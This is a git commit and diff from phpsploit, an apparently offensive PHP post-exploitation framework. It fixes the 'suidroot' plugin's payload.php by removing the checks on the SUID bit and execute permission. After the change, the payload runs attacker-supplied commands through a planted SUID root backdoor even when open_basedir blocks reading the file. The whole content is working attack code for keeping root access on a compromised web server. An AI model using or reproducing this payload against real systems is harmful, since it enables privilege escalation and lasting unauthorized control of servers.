0f25b9636cc7a025862c05e92cfd91e3b93912b2
nil0x42 <nil0x42@gmail.com>
2019-10-23 12:38:12 +0000

    plugin/suidroot: fix #105 invalid assumptions
    https://github.com/nil0x42/phpsploit/issues/105
    ---
    `suidroot` plugin makes invalid assumptions:
      The suidroot plugin checks in payload.php if the file has SUID bit set
      before execution.
      Therefore, in a context where open_basedir restriction doesn't allow to
      read SUIDROOT_BACKDOOR, the plugin will leave with an error message
      while the backdoor could in reality be executed..

--- plugins/system/suidroot/payload.php
+++ plugins/system/suidroot/payload.php
@@ -1,28 +1,8 @@
 <?
 
 !import(execute)
-!import(getPerms)
 
-// check SUIDROOT_BACKDOOR permissions
-if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 3, 1) != 's')
-    return error("%s (SUIDROOT_BACKDOOR): SUID bit is not set",
-        $PHPSPLOIT['BACKDOOR']);
-if (substr(getPerms($PHPSPLOIT['BACKDOOR']), 9, 1) != 'x')
-    return error("%s (SUIDROOT_BACKDOOR): Not executable",
-        $PHPSPLOIT['BACKDOOR']);
-
-// // write command to SUIDROOT_PIPE file
-// if (($pipe_file = @fopen($PHPSPLOIT['PIPE'], 'w')) === False)
-//     return error("%s (SUIDROOT_PIPE): Not writeable",
-//         $PHPSPLOIT['PIPE']);
-// fwrite($pipe_file, $PHPSPLOIT['COMMAND']);
-// fclose($pipe_file);
-
-// execute SUIDROOT_BACKDOOR
-// return $PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"];
 $result = execute($PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"]);
-// $result = execute("exec 2>&1;" . $PHPSPLOIT['BACKDOOR']);
-// file_put_contents($PHPSPLOIT['PIPE'], "");
 return $result;
 
 ?>
